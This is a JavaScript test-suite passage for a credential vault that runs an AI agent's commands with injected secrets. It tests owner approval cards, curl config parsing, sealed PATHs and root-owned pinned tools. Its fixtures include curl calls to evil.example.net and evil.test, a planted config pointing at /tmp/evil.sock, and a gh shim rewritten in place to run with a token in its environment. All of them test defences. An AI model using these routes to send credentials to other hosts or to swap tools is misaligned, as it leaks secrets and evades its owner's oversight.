    'round 17 (item 1): curl -K whose config is a $VAULT_FILE template the card RENDERS IN FULL ⇒ «always» IS offered (the owner sees the agent\'s only written input); the card shows the template, the second password grants it, an identical re-run runs with NO card (by «always»), and the persisted «always» row carries templateHash + templateBytes for lane vault-use-grants', { always: u1.card && u1.card.action.always, by: [u1r.by || u1r.code, u2.by || u2.code], templateHash: urow && urow.templateHash, templateBytes: urow && urow.templateBytes });
  // a template with one header ADDED ⇒ a NEW card (the stored «always» no longer matches; the card shows the template with the added line)
  fs.writeFileSync(path.join(w.work, 'router.cfg'), 'header = "X-API-KEY: $VAULT{agent:conv-1/site-pw}"\nheader = "Accept: application/json"\nheader = "X-Extra: added-by-agent"\ninsecure\nsilent\n');
  const uEdit = await runAnswered(w, uArgs, { answer: 'deny' });
  ok(!!uEdit.card && uEdit.card.action.always === true && /X-Extra: added-by-agent/.test(uEdit.card.detail || '') && uEdit.r.code === 'ask_denied',
    'round 17 (item 1): the SAME command with ONE header ADDED to the template ⇒ a NEW card (the «always» was keyed on the old bytes) that shows the template with the added header — «always» still on offer for the new template', { always: uEdit.card && uEdit.card.action.always, named: /X-Extra/.test(uEdit.card.detail || '') });
  // round 18 (item 2): a template PAST the card render bound ⇒ card_too_long (ONE verdict for every template whatever carries it — nothing ran, no card), its words naming the template, its size and how to shrink it; NEVER a note that hides its bytes while the run proceeds (r17's hole)
  fs.writeFileSync(path.join(w.work, 'big.cfg'), 'x = "$VAULT{agent:conv-1/site-pw}"\n' + '# filler to pass the card render bound\n'.repeat(400));
  const uBig = await w.door.run({ caller: w.caller, args: ['--file', 'CFG=@big.cfg', '--', 'curl', '-s', '-K', '$VAULT_FILE{CFG}', 'https://192.168.4.1/sites'], cwd: w.work });
  ok(uBig.code === 'card_too_long' && /template CFG \(@big\.cfg\) is \d+ bytes/.test(uBig.words || '') && /shorten the template/.test(uBig.words || '') && !cardsOf(w).length,
    'round 18 (item 2): a CONFIG template PAST the card render bound ⇒ card_too_long (nothing ran, no card), the words naming the template + size + how to shrink — r17 wrongly showed a note and still ran', { code: uBig.code, words: (uBig.words || '').slice(0, 90) });
  // and a NON-config over-bound template (a --data-binary body carried by --file) ⇒ the SAME card_too_long — item 2 is universal, not config-only (r17 offered «Always» beside a note and bypassed the base's card_too_long, hiding a 9 KB body)
  fs.writeFileSync(path.join(w.work, 'body.json'), '{"k":"$VAULT{agent:conv-1/site-pw}","f":"' + 'x'.repeat(5000) + '"}');
  const uBody = await w.door.run({ caller: w.caller, args: ['--file', 'B=@body.json', '--', 'curl', '-s', '--data-binary', '$VAULT_FILE{B}', 'https://192.168.4.1/sites'], cwd: w.work });
  ok(uBody.code === 'card_too_long' && /template B \(@body\.json\) is \d+ bytes/.test(uBody.words || '') && !cardsOf(w).length,
    'round 18 (item 2): a BODY template (--data-binary @file) PAST the bound ⇒ card_too_long too (the verdict is ONE, whatever flag carries the template)', { code: uBody.code, words: (uBody.words || '').slice(0, 90) });
  // round 19 (item 5): the card_too_long bound is a CARD's bound — it applies ONLY where a card would be drawn. An agent's OWN minted value to its OWN host (api.example.com) runs by:own with NO card, so a 7 KB body NEVER reaches the bound (daade1a7 refused it card_too_long before the verdict, with words about an approval that road never asks for). The owner-entry / another-host body above still draws a card ⇒ card_too_long.
  fs.writeFileSync(path.join(w.work, 'ownbody.json'), '{"k":"$VAULT{agent:conv-1/site-pw}","f":"' + 'y'.repeat(7000) + '"}');
  const uOwn = await w.door.run({ caller: w.caller, args: ['--file', 'B=@ownbody.json', '--', 'curl', '-s', '--data-binary', '$VAULT_FILE{B}', 'https://api.example.com/x'], cwd: w.work });
  ok(uOwn.ok && uOwn.by === 'own' && !cardsOf(w).length && uOwn.code !== 'card_too_long', 'round 19 (item 5): an agent\'s OWN 7 KB --data-binary body to its OWN host runs by:own (no card) — card_too_long is a CARD\'s bound, never a pre-verdict refusal of an own run (daade1a7: card_too_long)', { by: uOwn.by || uOwn.code });
  // round 18 (item 3): a SHOWN config template that NESTS another agent-writable file (config = "./b.cfg") ⇒ the card shows the template IN FULL but «Always» is NOT offered — the agent could rewrite b.cfg after the grant and route the value to a new host with no card; the card names the directive
  fs.writeFileSync(path.join(w.work, 'nest.cfg'), 'header = "X-API-KEY: $VAULT{agent:conv-1/site-pw}"\nconfig = "./b.cfg"\nsilent\n');
  const uNest = await runAnswered(w, ['--file', 'CFG=@nest.cfg', '--', 'curl', '-s', '-K', '$VAULT_FILE{CFG}', 'https://192.168.4.1/sites'], { answer: 'deny' });
  const und = (uNest.card && uNest.card.detail) || '';
  ok(!!uNest.card && uNest.card.action.always === false && /Template CFG \(@nest\.cfg\):/.test(und) && /config = "\.\/b\.cfg"/.test(und) && /«Always» is not offered: the template's `config \.\/b\.cfg` directive reads a file/.test(und) && uNest.r.code === 'ask_denied',
    'round 18 (item 3): a shown config template that nests ./b.cfg (config = "./b.cfg") ⇒ the card shows it but «Always» is NOT offered, naming the directive the agent could rewrite after a grant (base 0c1901c5: «Always» offered)', { always: uNest.card && uNest.card.action.always, named: /config \.\/b\.cfg/.test(und) });
  // round 18 (item 1): a http(s) URL carrying userinfo on a known tool's command ⇒ url_userinfo by name (a credential-carrying URL can disguise which host the tool contacts; nothing ran, no card)
  const uUi = await w.door.run({ caller: w.caller, args: ['--env', `T=${MINT}`, '--', 'curl', '-s', 'https://u:p@evil.example.net/x'], cwd: w.work });
  ok(uUi.code === 'url_userinfo' && /user\[:password\] before the host/.test(uUi.words || '') && !cardsOf(w).length,
    'round 18 (item 1): a http(s) URL with userinfo (https://u:p@host) in a known tool ⇒ url_userinfo by name (nothing ran, no card) — a credential-carrying URL is never a route', { code: uUi.code });
  // round 19 (item 4): curl's OWN config-file grammar (parseCfgLine, pinned by this table) — optional leading dashes, = / : / whitespace separators, a "-quoted value with escapes read to the closing quote (a trailing # comment discarded), an unquoted value to end-of-line, a # comment line skipped, a single-letter option case-SENSITIVE.
  { const PC = [
      ['-K ./b.cfg', { key: 'K', val: './b.cfg' }], ['config = "./b.cfg"', { key: 'config', val: './b.cfg' }],
      ['config: ./b.cfg', { key: 'config', val: './b.cfg' }], ['CONFIG=./b.cfg', { key: 'CONFIG', val: './b.cfg' }],
      ['cookie = "jar.txt" # a=b', { key: 'cookie', val: 'jar.txt' }], ['  # just a comment', { key: null, val: '' }],
      ['netrc', { key: 'netrc', val: '' }], ['--data   @body.txt', { key: 'data', val: '@body.txt' }],
    ];
    const pcBad = PC.filter(([line, want]) => { const g = VR.parseCfgLine(line); return g.key !== want.key || g.val !== want.val; });
    ok(!pcBad.length, 'round 19 (item 4): parseCfgLine is curl\'s own config grammar — dashes/=/:/whitespace separators, a quoted value to the closing quote (trailing # discarded), a # comment line skipped, a single-letter option case-sensitive', pcBad.map(([l]) => [l, VR.parseCfgLine(l)]));
    // cfgRouteHosts: HOST2 of connect-to, the host of a scheme-less / scheme url, blind on a {{var}}, file on url=@file
    const CR = [['connect-to', '::evil.test:443', ['evil.test']], ['url', 'evil.test/x', ['evil.test']], ['url', 'https://evil.test/x', ['evil.test']], ['proxy', 'http://p.example:8080', ['p.example']], ['url', '@urls.txt', 'file'], ['url', 'https://{{H}}/x', 'blind']];
    const crBad = CR.filter(([k, v, want]) => { const r = VR.cfgRouteHosts(k, v); const got = r.blind ? 'blind' : r.file ? 'file' : (r.hosts || []); return JSON.stringify(got) !== JSON.stringify(want); });
    ok(!crBad.length, 'round 19 (item 4): cfgRouteHosts reads a curl route directive\'s host (connect-to HOST2, scheme-less & scheme url, proxy), a {{var}} is blind, url=@file is a file', crBad.map(([k, v]) => [k, v, VR.cfgRouteHosts(k, v)]));
    // configNestedFile: EVERY measured spelling ⇒ reads!=null naming the directive (always withheld); the route ones name a host; expand-url ⇒ blind
    const curlRow = VR.knownToolOf('curl');
    const CN = [
      ['-K ./b.cfg\n', 'config ./b.cfg', [], false], ['-E ./c.pem\n', 'cert ./c.pem', [], false], ['-b jar.txt\n', 'cookie jar.txt', [], false],
      ['-d @./d.txt\n', 'data @./d.txt', [], false], ['data-urlencode = "k@./d.txt"\n', 'data-urlencode k@./d.txt', [], false],
      ['header = @./h.txt\n', 'header @./h.txt', [], false], ['netrc\n', 'netrc', [], false], ['url = @./urls.txt\n', 'url @./urls.txt', [], false],
      ['variable = H@./h.txt\nexpand-url = "https://{{H}}/x"\n', 'variable H@./h.txt', [], true],
      ['url = "evil.test/x"\n', 'url evil.test/x', ['evil.test'], false], ['connect-to = ::evil.test:443\n', 'connect-to ::evil.test:443', ['evil.test'], false],
      ['location\n', 'location', [], false], ['user-agent = foo\nsilent\n', null, [], false],
    ];
    const cnBad = CN.filter(([text, wr, wh, wb]) => { const d = VR.configNestedFile(text, curlRow); return d.reads !== wr || JSON.stringify(d.hosts) !== JSON.stringify(wh) || d.blind !== wb; });
    ok(!cnBad.length, 'round 19 (item 4): configNestedFile catches EVERY measured spelling (short -K/-E/-b/-d, data-urlencode/header/netrc/url @file, a # comment stripped so cookie reads a filename) => reads names the directive; url/connect-to name a host; expand-url {{var}} => blind; a benign template reads nothing', cnBad.map(([t]) => [t.slice(0, 30), VR.configNestedFile(t, curlRow)]));
    // note-vs-offers (report item): one source — the shown-in-full template (ud, r17) OFFERS «Always» and shows NO «not offered» note; the nested one (und) withholds it and names the directive. They never contradict (the over-bound note is gone; the bound is card_too_long).
    ok(/Template CFG \(@router\.cfg\):/.test(ud) && !/«Always» is not offered/.test(ud) && /«Always» is not offered/.test(und) && und.includes('config ./b.cfg'), 'round 19 (report): a card offer and its «not offered» note never contradict — the shown-in-full template (ud) offers «always» with NO note, the nested one (und) withholds it and names the directive (the over-bound note is gone; the bound is card_too_long)', { udOffers: !/is not offered/.test(ud), undNote: /is not offered/.test(und) }); }
  // a LOCAL instance keeps the base rule: one 允许, then that shape runs with no card this unlock
  const wl = await world({ instance: 'local' });
  const l1 = await runAnswered(wl, shellArgs, { answer: 'once' });
  const l2 = await wl.door.run({ caller: wl.caller, args: shellArgs, cwd: wl.work });
  const l3 = await runAnswered(wl, ['--env', `T=${MINT}`, '--', '/bin/sh', '-c', 'curl -s https://api.example.com/v1/other'], { answer: 'deny' });
  ok(!!l1.card && l1.r.ok && /Allow lets this command shape run with it again without asking until the vault locks/.test(l1.card.detail || '') && l2.ok && l2.by === 'own' && !leaks(l2.stdout || '', MINT_V).length && !!l3.card,
    'on a LOCAL instance: one 允许 for the shell shape, then the same shape runs with no card; another shell command asks again', { by: l2.by || l2.code, third: !!l3.card });
  wl.vault.lock('door');
  // THE LOCK: an own run is ended mid-run like any other; the passes go with the unlock
  const pidFile = path.join(w.work, 'own-pid.txt');
  const hang = w.door.run({ caller: w.caller, args: ['--env', `T=${OWN}`, '--', NODE, PRINTER, 'hang', pidFile], cwd: w.work });
  let pid = null; for (let k = 0; k < 500 && !pid; k++) { try { pid = Number(fs.readFileSync(pidFile, 'utf8')) || null; } catch { } await sleep(10); }
  w.vault.lock('door');
  const hr = await hang;
  ok(!!pid && hr.code === 'vault_locked' && hr.killed === true && !alive(pid), 'a LOCK still ends a run of its own entry mid-run (the child gone, the answer vault_locked)', [pid, hr.code, hr.killed]);
  await w.vault.unlock(PW);
  const passGone = await runAnswered(w, ['--env', `T=${MINT}`, '--', 'curl', '-s', 'https://elsewhere.example.net/x'], { answer: 'deny' });
  const alwaysGone = await runAnswered(w, kyArgs, { answer: 'deny' });
  ok(!!passGone.card && !!alwaysGone.card, 'after the lock the host pass is gone — that host asks again — and the opaque route (curl --resolve) asks its own card as it always does (it never held a standing pass)', [!!passGone.card, !!alwaysGone.card]);
  // THE REQUEST, THE LIST, THE OWNER'S CARD
  const q = w.door.request({ caller: { ...w.caller, scope: 'conv-1' }, entry: OWN, purpose: 'push the tag' });
  ok(q.ok && q.already === 'own' && !q.minted && !(w.userTodos.snapshot().open || []).some((x) => x.action && x.action.type === 'vault-grant-ask'), 'a request for its own entry ⇒ already: own — no card in For you (the owner is never asked for what it stored itself)', q);
  const qm = w.door.request({ caller: { ...w.caller, scope: 'conv-1' }, entry: MINT, purpose: 'sign in' });
  ok(qm.ok && qm.already === 'own' && qm.minted === true && qm.for === 'api.example.com', 'ROUND 2: a request for its own MINTED entry says it is minted and for which host (the CLI then says another host or a blind command still asks)', qm);
  const mine = (w.door.runnableFor({ ...w.caller, scope: 'sess-77-1', conv: 'conv-1' }).entries || []).filter((e) => e.by === 'own').map((e) => e.ref).sort();
  const theirs = (w.door.runnableFor({ ...w.caller, conversationId: 'conv-2', scope: 'sess-79-1', conv: 'conv-2' }).entries || []).map((e) => e.ref);
  const mintedRow = (w.door.runnableFor({ ...w.caller, scope: 'sess-77-1', conv: 'conv-1' }).entries || []).find((e) => e.ref === MINT) || {};
  ok(mine.join() === [MINT, OWN, 'vault://agent:conv-1/gh-mint', 'vault://agent:conv-1/gh-ghe'].sort().join() && !theirs.some((r) => r.startsWith('vault://agent:conv-1/')) && mintedRow.minted === true && mintedRow.for === 'api.example.com', '`list` names its own entries (by own; a minted one with its host) to its conversation — and never to another', { mine, theirs, mintedRow });
  openRow(w);
  const owner = await runAnswered(w, ['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'env'], { answer: 'once' });
  const od = (owner.card && owner.card.detail) || '';
  ok(!!owner.card && owner.r.ok && /Stored by: vault:\/\/mounts\/m1\/secretKey — you/.test(od) && /Why it asks: another conversation is using it — this conversation did not store it/.test(od), 'the OWNER\'s entry keeps today\'s card (the switch + a card per run on a cluster) — now saying who stored it and why it asks', od.split('\n').filter((l) => /^(Stored by|Why it asks)/.test(l)));
}

// ⑫ THE OWNERSHIP SEAL + TOOL DIGEST + ENV ALLOWLIST (lane vault-agent-own round 12) — the environment of a vault run is a place
// NOBODY can write, made for THAT run, and the TOOL cannot be swapped. "Cannot write" is OWNERSHIP, never mode bits: a PATH dir is
// kept only when ROOT owns it with no group/other write bit (a uid-owned 0555 dir is DROPPED — its owner chmods at will). round 14:
// a pinned credential tool (gh) runs with the minted value ONLY when it is SEALED — its realpath chain is root-owned AND the open
// fd's inode is root-owned (DOOR.sealedToolReal); a uid-owned tool is tool_not_sealed (the fd pins WHICH inode runs, root ownership
// pins WHAT is in it — r13's fd exec'd the agent's CURRENT bytes after an in-place rewrite). The sha256 is then the DRIFT detector
// (tool_changed on a package roll). The credential is HOMED to the run's ROUTING host (shape.routeHosts). A test cannot chown a
// scratch binary to root, so the "runs" legs inject toolSealed (model GHREAL as root-owned) + a toolDigest that vouches; the REAL
// rule is driven on /usr/bin/gh (an ownership control) and the GUARDED leg runs the REAL pinned gh (streaming hash + WIRE).
{
  const sw = await world({ instance: 'cluster' });
  const NOWHERE = DOOR.SEAL_NOWHERE;
  const REAL = DOOR.rootOwnedNoWrite;                     // the ACTUAL ownership predicate (uid 0 && no group/other write)
  const GHSHA = VR.knownToolOf('gh').toolSha256;          // the pinned tool digest
  const capOf = () => { let cap = null; const spawn = (cmd, args, opts) => { cap = { cmd, args, env: opts.env, cwd: opts.cwd, argv0: opts.argv0, detached: opts.detached, stdio: opts.stdio }; const c = new EventEmitter(); c.pid = 99001; c.stdout = new EventEmitter(); c.stdout.destroy = () => {}; c.stderr = new EventEmitter(); c.stderr.destroy = () => {}; c.stdin = null; setImmediate(() => { c.emit('exit', 0, null); c.emit('close', 0, null); }); return c; }; return { get: () => cap, spawn }; };
  // a uid-owned dir holding a fake gh; the door (REAL ownership) sees it as replaceable, so the digest gate runs — an injected
  // toolDigest returns the PIN for this exact path (the fake "matches", runs ok:own), a different sha for anything else.
  const GHREAL = path.join(ROOT, 'ghreal'); fs.mkdirSync(GHREAL, { recursive: true });
  fs.writeFileSync(path.join(GHREAL, 'gh'), "#!/usr/bin/env node\nprocess.stdout.write('gh\\n');\n", { mode: 0o755 });
  const GHREAL_GH = path.join(GHREAL, 'gh');
  const digestVouch = (fd) => { let tgt = null; try { tgt = fs.readlinkSync('/proc/self/fd/' + fd); } catch { } return Promise.resolve(tgt === GHREAL_GH ? GHSHA : 'dead'.repeat(16)); };   // r13: the door hands the OPEN fd — resolve it back to the path it holds; 64 hex != the pin for any other binary
  const sealedVouch = (p, fd) => p === GHREAL_GH || DOOR.sealedToolReal(p, fd);   // round 14: model GHREAL as a ROOT-OWNED install (a test cannot chown to root); the REAL chain+fstat rule runs on every other path
  const mkGh = (extra) => sw.mk(DOOR, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: sealedVouch, ...extra });
  // plant config.yml + hosts.yml where round 10 minted its dir — the seal must point NOWHERE near it
  const planted = path.join(sw.dataDir, 'vault-run-env'); fs.mkdirSync(planted, { recursive: true });
  fs.writeFileSync(path.join(planted, 'config.yml'), 'http_unix_socket: /tmp/evil.sock\n'); fs.writeFileSync(path.join(planted, 'hosts.yml'), 'evil.invalid:\n    user: u\n');

  // RUN A — own STORED gh-token, gh issue list (ok:own on a cluster). The agent PATH head is a uid-owned dir with a `git` shim
  // (WSEAL) + a not-yet dir (NOTYET) + the uid-owned gh dir; the REAL seal keeps ONLY the root-owned system dirs.
  const A = capOf();
  const dA = mkGh({ spawnImpl: A.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [WSEAL, NOTYET, GHREAL, '/usr/bin', '/bin'].join(':') }) });
  const rA = await dA.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
  const E = A.get() ? A.get().env : {};
  ok(rA.ok && rA.by === 'own' && !!A.get(), 'round 12/14: gh issue list (own stored, a SEALED gh whose bytes MATCH the pin) ran ok:own — a sealed pinned tool is hashed (drift) + exec\'d as the SAME inode via /proc/fd, neither refused nor blinded', rA.code || rA);
  ok(E.HOME === NOWHERE && E.GH_CONFIG_DIR === NOWHERE && E.XDG_CONFIG_HOME === NOWHERE && E.XDG_STATE_HOME === NOWHERE && E.XDG_CACHE_HOME === NOWHERE && E.XDG_DATA_HOME === NOWHERE,
    'BLOCKER (r11): HOME, GH_CONFIG_DIR and every XDG_* point at SEAL_NOWHERE — a planted config / hosts / state is never read', { HOME: E.HOME, NOWHERE });
  ok(fs.readdirSync(planted).sort().join(',') === 'config.yml,hosts.yml', 'BLOCKER (r11): the door wrote NOTHING in the round-10 dir — it is no longer the run environment', fs.readdirSync(planted));
  const dirs = (E.PATH || '').split(':');
  ok(!dirs.includes(WSEAL) && !dirs.includes(NOTYET) && !dirs.includes(GHREAL) && dirs.includes('/usr/bin') && dirs.every((d) => DOOR.sealDirReal(d) === d),
    'round 12/13 (BLOCKER): the sealed PATH is root-owned REALPATHS only — WSEAL/NOTYET/GHREAL (all uid-owned) are dropped, /usr/bin kept, every surviving entry is its own canonical root-owned realpath', { WSEAL: dirs.includes(WSEAL), NOTYET: dirs.includes(NOTYET), GHREAL: dirs.includes(GHREAL), usrbin: dirs.includes('/usr/bin'), dirs });
  ok(E.GIT_CONFIG_GLOBAL === '/dev/null' && E.GIT_CONFIG_NOSYSTEM === '1' && E.GIT_TERMINAL_PROMPT === '0', 'BLOCKER (r11): gh’s git child reads no user / system config', { GIT_CONFIG_GLOBAL: E.GIT_CONFIG_GLOBAL });
  ok(E.GH_TOKEN === 'agent-minted-value-0123456789' && E.GH_HOST === 'github.com' && E.GH_ENTERPRISE_TOKEN === undefined, 'round 15 (the ONE host set): a STORED value run as a default-host verb (gh issue list) ROUTES to github.com (routeHosts\' default) — GH_HOST is pinned to github.com and the credential stays GH_TOKEN (not re-homed to GH_ENTERPRISE_TOKEN)', { token: !!E.GH_TOKEN, GH_HOST: E.GH_HOST });

  // B-7f18 (B-460d's follow-up): THE RUN STARTS BELOW THE HUB — handed the start's step, the door spawns EXACTLY what it spawned
  // before (the same program, argv, argv[0], env, options: never `nice` in front, which would hold the minted env unchecked and lose
  // the typed argv[0]) and sets the child `by` below the hub the moment spawn returns; none handed (the setting off, no nice) ⇒ no set
  {
    const NICE = { nice: '/usr/bin/nice', by: 5 }, ENVP = () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [WSEAL, NOTYET, GHREAL, '/usr/bin', '/bin'].join(':') });
    const RUNP = { caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work };
    const shape = (c) => c && JSON.stringify({ cmd: c.cmd, args: c.args, argv0: c.argv0, detached: c.detached, stdio: c.stdio, cwd: c.cwd, env: Object.fromEntries(Object.entries(c.env || {}).filter(([k]) => k !== DOOR.MARK_ENV).sort()) });
    const legOf = async (mod) => {
      const sets = [], P0 = capOf(), P1 = capOf(), P2 = capOf(), P3 = capOf();
      const r0 = await sw.mk(mod, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: sealedVouch, spawnImpl: P0.spawn, lowerImpl: (pid, by) => sets.push(['none', pid, by]), agentEnv: ENVP }).run(RUNP);
      const r1 = await sw.mk(mod, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: sealedVouch, spawnImpl: P1.spawn, spawnPriority: () => ({ priority: NICE }), lowerImpl: (pid, by) => sets.push(['lowered', pid, by]), agentEnv: ENVP }).run(RUNP);
      const r2 = await sw.mk(mod, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: sealedVouch, spawnImpl: P2.spawn, spawnPriority: () => { throw new Error('no verdict'); }, lowerImpl: (pid, by) => sets.push(['threw', pid, by]), agentEnv: ENVP }).run(RUNP);
      const r3 = await sw.mk(mod, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: sealedVouch, spawnImpl: P3.spawn, spawnPriority: () => ({ priority: NICE }), lowerImpl: () => { throw Object.assign(new Error('gone'), { code: 'ESRCH' }); }, agentEnv: ENVP }).run(RUNP);
      return { ok: [r0, r1, r2, r3].every((r) => r && r.ok), same: !!P0.get() && [P1, P2, P3].every((P) => shape(P.get()) === shape(P0.get())), sets: JSON.stringify(sets), argv0: P1.get() && P1.get().argv0, cmd: P1.get() && P1.get().cmd };
    };
    const L = await legOf(DOOR);
    ok(L.ok && L.same && L.sets === JSON.stringify([['lowered', 99001, 5]]) && /^\/proc\/\d+\/fd\/\d+$/.test(L.cmd || '') && /\/gh$/.test(L.argv0 || ''),
      `B-7f18: handed the start's step, the run's spawn is the release's own, byte for byte (the hashed inode «${L.cmd}», argv[0] the tool's path, the same env and options) and its child is set 5 below the hub ONCE, after the spawn — none handed: no set; a verdict that throws: no set; a refused set: the run ran`, L);
    // RED CONTROL (scripts/mutant-copy.mjs, the anchor through scratch.mjs anchored()): the door with its set cut runs at the hub's priority
    const SRC7 = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    let cut = null; try { cut = await legOf(M.load('src/server/vault-run-door.js', anchored(SRC7, 'if (by && child && child.pid) { try { lowerImpl(child.pid, by); } catch { } }', '', 'B-7f18 the set cut'), 'b7f18-noset')); } catch (e) { cut = { error: String(e && e.message).slice(0, 160) }; }
    ok(!!cut && !cut.error && cut.sets === '[]', `RED CONTROL: the door with its set cut lowers nothing — the leg above is red on it${cut && cut.error ? ` (${cut.error})` : ''}`, cut);
    // THE REAL ROAD (its reader's should 4): a REAL spawn through the door with the DEFAULT setter (lowerRun) — the child reads its own
    // niceness once its stdin closed, and the door writes that stdin only AFTER the set (the same turn): an order, never a race
    const own = os.getPriority(), want = Math.min(19, own + 5);
    const wN = await world(); openRow(wN);
    const NICE_RUN = ['--stdin', 'vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'nice'];
    const { r: rN } = await runAnswered(wN, NICE_RUN, { answer: 'once', door: wN.mk(DOOR, { spawnPriority: () => ({ priority: NICE }) }) });
    const wO = await world(); openRow(wO);
    const { r: rO } = await runAnswered(wO, NICE_RUN, { answer: 'once' });
    ok(!!rN && rN.ok && rN.stdout === 'NICE ' + want && !!rO && rO.ok && rO.stdout === 'NICE ' + own,
      `B-7f18 THE REAL ROAD: a real run handed the step reads its own niceness ${rN && rN.stdout} (the suite's own ${own} + 5); handed none it reads ${rO && rO.stdout}${want > own ? '' : ' — NOT OBSERVABLE here: the suite already runs at niceness 19 (the set leaves it there)'}`, { own, want, n: rN && { ok: rN.ok, out: rN.stdout, err: rN.error }, o: rO && { ok: rO.ok, out: rO.stdout, err: rO.error } });
  }

  // RUN A2 — INVERTED (round 12/13): the agent MAKES NOTYET 0555 (uid-owned) and a FRESH seal still DROPS it — "cannot write" is
  // OWNERSHIP, not the write bit (round 11 with accessSync W_OK KEPT this exact dir and a planted `git` shim ran). A fresh door so
  // the realpath seal re-computes with NOTYET present as 0555: its chain is not root-owned.
  fs.mkdirSync(NOTYET, { recursive: true }); fs.chmodSync(NOTYET, 0o555);
  const A2 = capOf();
  const dA2 = mkGh({ spawnImpl: A2.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [WSEAL, NOTYET, GHREAL, '/usr/bin', '/bin'].join(':') }) });
  await dA2.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
  const E2 = A2.get().env; const dirs2 = (E2.PATH || '').split(':');
  ok(!dirs2.includes(NOTYET) && dirs2.includes('/usr/bin'), 'round 12/13 (BLOCKER, RUN A2 INVERTED): a uid-owned 0555 dir is DROPPED by the realpath seal (its chain is not root-owned) — round 11 KEPT it; the shim would run', { kept: dirs2.includes(NOTYET) });

  // SYMLINK SEAL (round 13 BLOCKER): the agent owns a PATH entry and points it at a ROOT dir so it passes the ownership check, then
  // re-points it to its own dir AFTER the spawn. The child PATH must hold the REALPATH (/usr/bin), never the link STRING — so the
  // re-point redirects nothing (gh's git/pager child resolves /usr/bin). Driven on the REAL sealDir (default); base kept the name.
  const MYLINK = path.join(ROOT, 'agent-link'); try { fs.unlinkSync(MYLINK); } catch { }
  fs.symlinkSync('/usr/bin', MYLINK);
  const Y = capOf();
  const dY = mkGh({ spawnImpl: Y.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [MYLINK, '/usr/bin', '/bin'].join(':') }) });
  await dY.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
  const EY = Y.get() ? Y.get().env : {}; const dirsY = (EY.PATH || '').split(':');
  ok(!!Y.get() && !dirsY.includes(MYLINK) && dirsY.includes('/usr/bin'),
    'round 13 (BLOCKER): an agent-owned symlink (PATH entry -> /usr/bin) is baked as its REALPATH /usr/bin, never the link STRING — re-pointing it after the spawn cannot redirect the child (base keeps the link name at the head)', { sealed: EY.PATH, hasLink: dirsY.includes(MYLINK) });

  // tool_not_sealed RED (round 14 BLOCKER): a uid-owned gh (its dir this user can write) is NEVER pinnable — tool_not_sealed BEFORE
  // the hash (the REAL sealed rule runs: no sealedVouch injection; the fixture's chain under /var/tmp is not root-owned-no-write).
  // On base (b728667d) the SAME uid-owned gh with a matching pin ran ok:own — r13's fd exec'd an inode the agent owns (rewritable).
  const NS = capOf();
  const dNS = sw.mk(DOOR, { isRootOwned: REAL, toolDigest: digestVouch, spawnImpl: NS.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });   // DEFAULT toolSealed = the REAL chain+fstat rule
  const rNS = await dNS.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
  ok(!rNS.ok && rNS.code === 'tool_not_sealed' && !NS.get(), 'round 14 (BLOCKER): a uid-owned pinned gh is tool_not_sealed — its realpath chain / open fd are not root-owned, so it never runs with the minted value (base ran it ok:own); nothing spawned', { ok: rNS.ok, code: rNS.code, spawned: !!NS.get() });

  // IN-PLACE REWRITE RED (round 14 BLOCKER, the reviewers' repro): a uid-owned gh REWRITTEN IN PLACE (truncate + write the SAME
  // inode) by the digest seam. On base the fd exec'd the inode's CURRENT bytes — the SHIM ran with the token in env (O_RDONLY and
  // /proc/<pid>/fd pin the inode, not its content). On mine the uid-owned tool is tool_not_sealed BEFORE the hash, so the rewrite
  // seam never even runs — nothing spawned.
  const IP = path.join(ROOT, 'inplace'); fs.mkdirSync(IP, { recursive: true });
  const IPGH = path.join(IP, 'gh'), IPMARK = path.join(IP, 'who-ran');
  fs.writeFileSync(IPGH, '#!/bin/sh\nprintf ORIGINAL > ' + IPMARK + '\n', { mode: 0o755 });
  try { fs.unlinkSync(IPMARK); } catch { }
  let rewrote = false;
  const rewriteDigest = (fd) => { try { fs.truncateSync(IPGH, 0); fs.writeFileSync(IPGH, '#!/bin/sh\nprintf SHIM > ' + IPMARK + '\n', { mode: 0o755 }); rewrote = true; } catch { } return Promise.resolve(GHSHA); };
  const dIP = sw.mk(DOOR, { isRootOwned: REAL, toolDigest: rewriteDigest, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [IP, '/usr/bin', '/bin'].join(':') }) });   // DEFAULT toolSealed = REAL; DEFAULT spawnImpl = REAL spawn
  const rIP = await dIP.run({ caller: sw.caller, args: ['--timeout', '15', '--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', IPGH, 'issue', 'list'], cwd: sw.work });
  await sleep(150);
  const ipRan = (() => { try { return fs.readFileSync(IPMARK, 'utf8'); } catch { return '(none)'; } })();
  ok(!rIP.ok && rIP.code === 'tool_not_sealed' && !rewrote && ipRan === '(none)', 'round 14 (BLOCKER, in-place rewrite): a uid-owned gh is tool_not_sealed BEFORE the hash — the rewrite seam never ran and nothing spawned (base: the fd exec\'d the rewritten SHIM with the token)', { code: rIP.code, rewrote, ipRan });

